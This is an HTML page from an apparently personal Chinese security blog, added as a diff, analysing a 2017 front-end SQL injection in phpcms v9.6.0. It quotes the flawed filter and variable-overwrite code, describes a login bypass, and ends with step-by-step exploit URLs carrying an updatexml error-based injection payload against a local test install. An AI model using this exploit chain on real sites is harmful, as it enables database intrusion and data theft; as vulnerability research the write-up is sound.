@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="web,php,代码审计," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="phpcms_v9.6.0的一个sql注入漏洞,无任何限制，危害不小。还是挺有意思的，于是记录一波。0x1 安全过滤函数safe_replace\phpcms\libs\functions\global.func.php safe_replace($string) &amp;#123;1234567891011121314$string = str_replace(&amp;apos;%20&amp;apos;,&amp;apo">
+<meta name="keywords" content="web,php,代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcms_v9.6.0前台注入分析">
+<meta property="og:url" content="http://yoursite.com/2017/09/23/phpcmsq前台注入分析/index.html">
+<meta property="og:site_name" content="Answer">
+<meta property="og:description" content="phpcms_v9.6.0的一个sql注入漏洞,无任何限制，危害不小。还是挺有意思的，于是记录一波。0x1 安全过滤函数safe_replace\phpcms\libs\functions\global.func.php safe_replace($string) &amp;#123;1234567891011121314$string = str_replace(&amp;apos;%20&amp;apos;,&amp;apo">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2017/09/23/phpcmsq前台注入分析/14901189695667.jpg">
+<meta property="og:updated_time" content="2017-09-23T14:25:57.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpcms_v9.6.0前台注入分析">
+<meta name="twitter:description" content="phpcms_v9.6.0的一个sql注入漏洞,无任何限制，危害不小。还是挺有意思的，于是记录一波。0x1 安全过滤函数safe_replace\phpcms\libs\functions\global.func.php safe_replace($string) &amp;#123;1234567891011121314$string = str_replace(&amp;apos;%20&amp;apos;,&amp;apo">
+<meta name="twitter:image" content="http://yoursite.com/2017/09/23/phpcmsq前台注入分析/14901189695667.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/09/23/phpcmsq前台注入分析/"/>
+
+
+
+
+
+  <title>phpcms_v9.6.0前台注入分析 | Answer</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Answer</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">不想成为别人眼中的自己</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/23/phpcmsq前台注入分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Answer">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Answer">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">phpcms_v9.6.0前台注入分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-23T22:00:25+08:00">
+                2017-09-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="phpcms-v9-6-0的一个sql注入漏洞-无任何限制，危害不小。还是挺有意思的，于是记录一波。"><a href="#phpcms-v9-6-0的一个sql注入漏洞-无任何限制，危害不小。还是挺有意思的，于是记录一波。" class="headerlink" title="phpcms_v9.6.0的一个sql注入漏洞,无任何限制，危害不小。还是挺有意思的，于是记录一波。"></a>phpcms_v9.6.0的一个sql注入漏洞,无任何限制，危害不小。还是挺有意思的，于是记录一波。</h2><h2 id="0x1-安全过滤函数safe-replace"><a href="#0x1-安全过滤函数safe-replace" class="headerlink" title="0x1 安全过滤函数safe_replace"></a>0x1 安全过滤函数safe_replace</h2><p>\phpcms\libs\functions\global.func.php</p>
+<figure class="highlight plain"><figcaption><span>safe_replace($string) &#123;</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$string = str_replace(&apos;%20&apos;,&apos;&apos;,$string);</div><div class="line">$string = str_replace(&apos;%27&apos;,&apos;&apos;,$string);</div><div class="line">$string = str_replace(&apos;%2527&apos;,&apos;&apos;,$string);</div><div class="line">$string = str_replace(&apos;*&apos;,&apos;&apos;,$string);</div><div class="line">$string = str_replace(&apos;&quot;&apos;,&apos;&quot;&apos;,$string);</div><div class="line">$string = str_replace(&quot;&apos;&quot;,&apos;&apos;,$string);</div><div class="line">$string = str_replace(&apos;&quot;&apos;,&apos;&apos;,$string);</div><div class="line">$string = str_replace(&apos;;&apos;,&apos;&apos;,$string);</div><div class="line">$string = str_replace(&apos;&lt;&apos;,&apos;&lt;&apos;,$string); $string = str_replace(&apos;&gt;&apos;,&apos;&gt;&apos;,$string);</div><div class="line">$string = str_replace(&quot;&#123;&quot;,&apos;&apos;,$string);</div><div class="line">$string = str_replace(&apos;&#125;&apos;,&apos;&apos;,$string);</div><div class="line">$string = str_replace(&apos;\\&apos;,&apos;&apos;,$string);</div><div class="line">return $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="0x2-注入触发点"><a href="#0x2-注入触发点" class="headerlink" title="0x2 注入触发点"></a>0x2 注入触发点</h2><p>\phpcms\modules\content\down.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">public function init() &#123;</div><div class="line">$a_k = trim($_GET[&apos;a_k&apos;]);</div><div class="line">if(!isset($a_k)) showmessage(L(&apos;illegal_parameters&apos;));</div><div class="line">$a_k = sys_auth($a_k, &apos;DECODE&apos;, pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;));</div><div class="line">if(empty($a_k)) showmessage(L(&apos;illegal_parameters&apos;));</div><div class="line">unset($i,$m,$f);</div><div class="line">parse_str($a_k);</div><div class="line">if(isset($i)) $i = $id = intval($i);</div><div class="line">if(!isset($m)) showmessage(L(&apos;illegal_parameters&apos;));</div><div class="line">if(!isset($modelid)||!isset($catid)) showmessage(L(&apos;illegal_parameters&apos;));</div><div class="line">if(empty($f)) showmessage(L(&apos;url_invalid&apos;));</div><div class="line">$allow_visitor = 1;</div><div class="line">$MODEL = getcache(&apos;model&apos;,&apos;commons&apos;);</div><div class="line">$tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&apos;tablename&apos;];</div><div class="line">$this-&gt;db-&gt;table_name = $tablename.&apos;_data&apos;;</div><div class="line">$rs = $this-&gt;db-&gt;get_one(array(&apos;id&apos;=&gt;$id));</div></pre></td></tr></table></figure>
+<p>最重要的点这里parse_str的函数有个特性，会把%27解析成单引号，所以结合前面的safe_replace函数我们用%*27就能绕过过滤</p>
+<p>然后我们再看看下一个重点<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">parse_str($a_k)；</div><div class="line">if(isset(\$i)) \$i = \$id = intval(\$i);</div></pre></td></tr></table></figure></p>
+<p> 这里比较明显可以变量覆盖，前面的parse_str() 函数可以产生我们想要的任何变量，<br>我们不获得 \$i 而是直接获取 \$id ，就不会进入intval了</p>
+<p>所以这里我们需要一个由sys_auth函数加密的a_k字符串。</p>
+<p>找其中一处用到sys_auth函数加密的地方，这里的src最后先get传送给set_cooke，然后set_cookie里面再调用sys_auth来加密src</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">public function swfupload_json() &#123;</div><div class="line">		$arr[&apos;aid&apos;] = intval($_GET[&apos;aid&apos;]);</div><div class="line">		$arr[&apos;src&apos;] = safe_replace(trim($_GET[&apos;src&apos;]));</div><div class="line">		$arr[&apos;filename&apos;] = urlencode(safe_replace($_GET[&apos;filename&apos;]));</div><div class="line">		$json_str = json_encode($arr);</div><div class="line">		$att_arr_exist = param::get_cookie(&apos;att_json&apos;);</div><div class="line">		$att_arr_exist_tmp = explode(&apos;||&apos;, $att_arr_exist);</div><div class="line">		if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</div><div class="line">			return true;</div><div class="line">		&#125; else &#123;</div><div class="line">			$json_str = $att_arr_exist ? $att_arr_exist.&apos;||&apos;.$json_str : $json_str;</div><div class="line">			echo $json_str;</div><div class="line">			param::set_cookie(&apos;att_json&apos;,$json_str);</div><div class="line">			return true;</div></pre></td></tr></table></figure>
+<h2 id="0x3-绕过登陆限制"><a href="#0x3-绕过登陆限制" class="headerlink" title="0x3 绕过登陆限制"></a>0x3 绕过登陆限制</h2><p>1.绕过登陆的限制，这里用了sys_auth去解密post提交的userid_flash，如果不为空就认为登陆成功，这里可以伪造userid_flash<br><img src="/2017/09/23/phpcmsq前台注入分析/14901189695667.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$this-&gt;userid = $_SESSION[&apos;userid&apos;] ？$_SESSION[&apos;userid&apos;] : (param::get_cookie(&apos;_userid&apos;) ? param::get_cookie(&apos;_userid&apos;) : sys_auth($_POST[&apos;userid_flash&apos;],&apos;DECODE&apos;));</div><div class="line">这一行就是在获取userid来作为判断是否登陆的依据</div></pre></td></tr></table></figure>
+<p>phpcms/modules/wap/index.php 中可以传入siteid到set_cookie中 从而可以用sys_uth来加密我们想要的userid_flash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$this-&gt;db = pc_base::load_model(&apos;content_model&apos;);</div><div class="line">		$this-&gt;siteid = isset($_GET[&apos;siteid&apos;]) &amp;&amp; (intval($_GET[&apos;siteid&apos;]) &gt; 0) ? intval(trim($_GET[&apos;siteid&apos;])) : (param::get_cookie(&apos;siteid&apos;) ? param::get_cookie(&apos;siteid&apos;) : 1);</div><div class="line">		param::set_cookie(&apos;siteid&apos;,$this-&gt;siteid);</div><div class="line">		／／这一行就是传经set_cookie，set_cookie会经过sys_auth加密，</div><div class="line">		所以我们可以控制siteid的出入，生成一个绕过登陆的userid</div><div class="line">		$this-&gt;wap_site = getcache(&apos;wap_site&apos;,&apos;wap&apos;);</div><div class="line">		$this-&gt;types = getcache(&apos;wap_type&apos;,&apos;wap&apos;);</div><div class="line">		$this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];</div><div class="line">		define(&apos;WAP_SITEURL&apos;, $this-&gt;wap[&apos;domain&apos;] ? $this-&gt;wap[&apos;domain&apos;].&apos;index.php?&apos; : APP_PATH.&apos;index.php?m=wap&amp;siteid=&apos;.$this-&gt;siteid);</div><div class="line">		if($this-&gt;wap[&apos;status&apos;]!=1) exit(L(&apos;wap_close_status&apos;))</div></pre></td></tr></table></figure>
+<h2 id="0x4-开始利用"><a href="#0x4-开始利用" class="headerlink" title="0x4 开始利用"></a>0x4 开始利用</h2><h3 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h3><p>先访问index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1<br>cookie里面会有一个xxx_siteid，我们提取出来然后赋值给userid_flash，<br>以后我们每次发攻击包都带着这个userid_flash</p>
+<h3 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h3><p>构造我们想要获取的加密字符串放入src 参数<br><a href="http://127.0.0.1:82/phpcms9.6.0//index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;filename=test.jpg&amp;src=&amp;id=3%*27and" target="_blank" rel="external">http://127.0.0.1:82/phpcms9.6.0//index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;filename=test.jpg&amp;src=&amp;id=3%*27and</a> updatexml(1,concat(0x7e,@@version),1)%23&amp;catid=1&amp;m=3&amp;modelid=3&amp;f=xxx</p>
+<h3 id="3、"><a href="#3、" class="headerlink" title="3、"></a>3、</h3><p>将src 参数后面的url编码一次，访问<br><a href="http://127.0.0.1:82/phpcms9.6.0//index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;filename=test.jpg&amp;src=%26id%3D3%25%2a27and%20updatexml%281%2Cconcat%280x7e%2C@@version%29%2C1%29%2523%26catid%3D1%26m%3D3%26modelid%3D3%26f%3Dxxx" target="_blank" rel="external">http://127.0.0.1:82/phpcms9.6.0//index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;filename=test.jpg&amp;src=%26id%3D3%25%2a27and%20updatexml%281%2Cconcat%280x7e%2C@@version%29%2C1%29%2523%26catid%3D1%26m%3D3%26modelid%3D3%26f%3Dxxx</a></p>
+<h3 id="4、"><a href="#4、" class="headerlink" title="4、"></a>4、</h3><p>取得cookie xxxx_att_json 的值<br>7542s9cd1Zysq4BatVr2IhZHpTeOU3mMf94DmbM4qyKjg1E3Xj-hXD6df0SNdBpRYqrlm-mL8yeBQTN2fkCNSqUs25BG3NJQ4OxoNYi7nzA7ZsRlQg2bM2o3UYreVCb0lQUs6-9rfPbdzvl0cqqMBvnvaiAyMY4ZIQUJfWTabSzNs6bZbIzDyk2bLBWYpR18Nk3Fdn8</p>
+<h3 id="5、"><a href="#5、" class="headerlink" title="5、"></a>5、</h3><p>将密文带入 a_k 参数中访问链接<br><a href="http://127.0.0.1:82/phpcms9.6.0/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=7542s9cd1Zysq4BatVr2IhZHpTeOU3mMf94DmbM4qyKjg1E3Xj-hXD6df0SNdBpRYqrlm-mL8yeBQTN2fkCNSqUs25BG3NJQ4OxoNYi7nzA7ZsRlQg2bM2o3UYreVCb0lQUs6-9rfPbdzvl0cqqMBvnvaiAyMY4ZIQUJfWTabSzNs6bZbIzDyk2bLBWYpR18Nk3Fdn8" target="_blank" rel="external">http://127.0.0.1:82/phpcms9.6.0/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=7542s9cd1Zysq4BatVr2IhZHpTeOU3mMf94DmbM4qyKjg1E3Xj-hXD6df0SNdBpRYqrlm-mL8yeBQTN2fkCNSqUs25BG3NJQ4OxoNYi7nzA7ZsRlQg2bM2o3UYreVCb0lQUs6-9rfPbdzvl0cqqMBvnvaiAyMY4ZIQUJfWTabSzNs6bZbIzDyk2bLBWYpR18Nk3Fdn8</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/23/phpcmsv9-6-1任意文件读取漏洞/" rel="next" title="phpcmsv9.6.1任意文件读取漏洞">
+                <i class="fa fa-chevron-left"></i> phpcmsv9.6.1任意文件读取漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/avatar.gif"
+              alt="Answer" />
+          
+            <p class="site-author-name" itemprop="name">Answer</p>
+            <p class="site-description motion-element" itemprop="description">我就是我</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#phpcms-v9-6-0的一个sql注入漏洞-无任何限制，危害不小。还是挺有意思的，于是记录一波。"><span class="nav-number">1.</span> <span class="nav-text">phpcms_v9.6.0的一个sql注入漏洞,无任何限制，危害不小。还是挺有意思的，于是记录一波。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-安全过滤函数safe-replace"><span class="nav-number">2.</span> <span class="nav-text">0x1 安全过滤函数safe_replace</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-注入触发点"><span class="nav-number">3.</span> <span class="nav-text">0x2 注入触发点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-绕过登陆限制"><span class="nav-number">4.</span> <span class="nav-text">0x3 绕过登陆限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-开始利用"><span class="nav-number">5.</span> <span class="nav-text">0x4 开始利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、"><span class="nav-number">5.1.</span> <span class="nav-text">1、</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、"><span class="nav-number">5.2.</span> <span class="nav-text">2、</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、"><span class="nav-number">5.3.</span> <span class="nav-text">3、</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、"><span class="nav-number">5.4.</span> <span class="nav-text">4、</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、"><span class="nav-number">5.5.</span> <span class="nav-text">5、</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Answer</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
